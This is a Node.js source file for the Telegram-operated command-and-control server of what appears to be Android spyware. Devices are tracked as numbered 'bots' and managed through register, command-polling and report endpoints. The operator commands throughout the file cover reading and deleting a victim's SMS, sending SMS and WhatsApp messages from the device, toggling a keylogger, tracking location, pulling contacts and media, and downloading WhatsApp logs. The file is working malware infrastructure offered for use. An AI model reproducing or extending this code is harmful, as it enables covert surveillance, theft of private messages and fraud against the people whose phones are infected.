require('dotenv').config();
const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');
const moment = require('moment-timezone');

// Validate env vars
if (!process.env.BOT_API || !process.env.USER_ID) {
  console.error('Missing BOT_API or USER_ID in .env');
  process.exit(1);
}

const bot = new Telegraf(process.env.BOT_API);
const app = express();
app.use(express.json());

// Nepal Time (+05:45)
const NP_TIME = () => moment().tz('Asia/Kathmandu').format('HH:mm');
const NP_DATE = () => moment().tz('Asia/Kathmandu').format('YYYY-MM-DD');

// Data Storage
let bots = {};
const DATA_FILE = 'bots.json';
if (fs.existsSync(DATA_FILE)) {
  try {
    bots = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (err) {
    console.error('Error loading bots.json:', err);
  }
}
function save() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(bots, null, 2));
  } catch (err) {
    console.error('Error saving bots.json:', err);
  }
}

// Auth
const ADMIN_ID = parseInt(process.env.USER_ID);
const PASSWORD = process.env.Password || 'GentleMan'; // Fallback
let loggedIn = false;

function isAdmin(ctx) {
  return ctx.from.id === ADMIN_ID && loggedIn;
}

function queueCmd(id, cmd) {
  if (!bots[id]) bots[id] = { pending: [] };
  bots[id].pending = bots[id].pending || [];
  bots[id].pending.push(cmd);
  save();
}

// BOT COMMANDS
bot.start(ctx => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.reply(`*GentleMan:- BOT* | Nepal Control\n\nPlease Enter The Password !\n\nTime: ${NP_TIME()} (+05:45)`, { parse_mode: 'Markdown' });
});

bot.command('login', ctx => {
  if (ctx.from.id !== ADMIN_ID) return;
  const input = ctx.message.text.trim();
  if (input === `/login BOT "${PASSWORD}"`) {
    loggedIn = true;
    ctx.reply(`*Access Granted !*\nHI ${PASSWORD} ☺️\n\n*GentleMan:- BOT v1.0.0 Active*\nNepal Time: ${NP_TIME()} | ${NP_DATE()}\nCountry: NEPAL`, { parse_mode: 'Markdown' });
  } else {
    ctx.reply('Wrong password.');
  }
});

bot.command('help', ctx => {
  if (!isAdmin(ctx)) return ctx.reply('Use `/login BOT "GentleMan"`', { parse_mode: 'Markdown' });
  ctx.reply(`*GentleMan:- BOT | Nepal Remote Control*

° /total bot info
° /online bot info
° /offline bot info
° /bot list
° /bot info [BOT-001]
° /device info [BOT-001]
° /permission info [BOT-001]
° /background [ALLOW/DENIED] [BOT-001]
° /sms [ALLOW/DENIED] [BOT-001]
° /contact [ALLOW/DENIED] [BOT-001]
° /location [ALLOW/DENIED] [BOT-001]
° /media [ALLOW/DENIED] [BOT-001]
° /sms info [BOT-001] [SIM1]
° /location info [BOT-001]
° /image backup mode [ON/OFF] [BOT-001]
° /audio backup mode [ON/OFF] [BOT-001]
° /video backup mode [ON/OFF] [BOT-001]
° /send sms [SIM1] [BOT-001] [+97798...] [Hello]
° /delete sms [SIM1] [BOT-001] [SMS-001]
° /sms.txt [SIM1] [BOT-001]
° /keylogger [ON/OFF] [BOT-001]
° /keylogger backup.txt [BOT-001]
° /whatsapp send [BOT-001] [+97798...] [Hi]
° /downloads whatsapp_logs.txt

> *Time:* ${NP_TIME()} (+05:45) | *Date:* ${NP_DATE()}`, { parse_mode: 'Markdown' });
});

// INFO COMMANDS
bot.command('total bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.keys(bots).length}`); });
bot.command('online bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.values(bots).filter(b => b.online).length}`); });
bot.command('offline bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.values(bots).filter(b => !b.online).length}`); });

bot.command('bot list', ctx => {
  if (!isAdmin(ctx)) return;
  const list = Object.keys(bots).map(id => `[${id}] ${bots[id].online ? 'ONLINE' : 'OFFLINE'}`).join('\n') || 'No bots';
  ctx.reply(list);
});

bot.command('bot info', ctx => {
  if (!isAdmin(ctx)) return;
  const id = ctx.message.text.split(' ')[2];
  const b = bots[id];
  if (!b) return ctx.reply('Not found.');
  const status = b.online ? 'ONLINE' : 'OFFLINE';
  ctx.reply(`${status}\n[${id}]\nREAL TIME: ${NP_TIME()}\nCountry: NEPAL\nFLAGS:`);
});

bot.command('device info', ctx => {
  if (!isAdmin(ctx)) return;
  const id = ctx.message.text.split(' ')[2];
  const b = bots[id];
  if (!b) return ctx.reply('Not found.');
  const status = b.online ? 'ONLINE' : 'OFFLINE';
  ctx.reply(`${status}\n[${id}]\nIP: ${b.ip||'0.0.0.0'}\nReal Time: ${NP_TIME()}\nName: ${b.device||'--'}\nAndroid: ${b.android||'--'}\nBattery: ${b.battery||'--'}%\nSIM1: ${b.sim1||'--'}\nSIM2: ${b.sim2||'--'}\nSerial: ${b.serial||'--'}`);
});

// PERMISSIONS
['background','sms','contact','location','media'].forEach(p => {
  bot.command(p, ctx => {
    if (!isAdmin(ctx)) return;
    const [,,action,id] = ctx.message.text.split(' ');
    if (!['ALLOW','DENIED'].includes(action) || !bots[id]) return;
    if (!bots[id].perm) bots[id].perm = {};
    bots[id].perm[p] = action;
    save();
    ctx.reply(`${p.toUpperCase()}: ${action} [${id}]`);
  });
});

// SMS & KEYLOG & MEDIA
bot.command('send sms', ctx => {
  if (!isAdmin(ctx)) return;
  const parts = ctx.message.text.split(' ');
  const sim = parts[2], id = parts[3], num = parts[4], msg = parts.slice(5).join(' ');
  queueCmd(id, `SMS|${sim}|${num}|${msg}`);
  ctx.reply(`SMS → ${num} [${sim}]`);
});

bot.command('keylogger', ctx => {
  if (!isAdmin(ctx)) return;
  const [,,mode,id] = ctx.message.text.split(' ');
  if (!['ON','OFF'].includes(mode)) return;
  queueCmd(id, `KEYLOG|${mode}`);
  ctx.reply(`KEYLOGGER ${mode} [${id}]`);
});

bot.command('sms.txt', ctx => {
  if (!isAdmin(ctx)) return;
  const [,,sim,id] = ctx.message.text.split(' ');
  const txt = (bots[id]?.sms?.[sim]||[]).map(s => `[${s.id}] ${s.msg}`).join('\n') || 'No SMS';
  ctx.replyWithDocument({ source: Buffer.from(txt), filename: `${sim}_${id}_sms.txt` });
});

// APK API
app.post('/register', (req, res) => {
  const { id, ...info } = req.body;
  bots[id] = { ...bots[id], ...info, online: true, lastSeen: Date.now() };
  save();
  console.log(`Registered bot: ${id}`);
  res.send('OK');
});

app.get('/cmd/:id', (req, res) => {
  const id = req.params.id;
  const cmds = bots[id]?.pending || [];
  bots[id].pending = [];
  save();
  res.json(cmds);
});

app.post('/report/:id', (req, res) => {
  const id = req.params.id;
  Object.assign(bots[id], req.body);
  save();
  console.log(`Report from ${id}:`, req.body);
  res.send('OK');
});

// START
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
bot.launch().then(() => console.log('Telegram BOT live'));
console.log(`GentleMan:- BOT v1.0.0 | Nepal | ${NP_TIME()}`);
